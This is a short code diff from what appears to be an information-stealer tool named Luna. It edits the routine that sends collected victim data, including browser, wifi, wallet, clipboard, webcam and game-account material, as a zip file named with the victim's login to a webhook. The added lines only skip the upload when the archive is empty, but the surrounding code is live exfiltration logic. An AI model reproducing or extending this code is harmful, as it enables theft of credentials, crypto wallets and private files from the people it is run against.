@@ -78,6 +78,8 @@ def main(webhook: str):
 			data.update({"content": content})
 
 	if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
+		if os.path.getsize(_file) == 22:
+			return
 		with open(_file, 'rb') as file:
 			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
 			requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
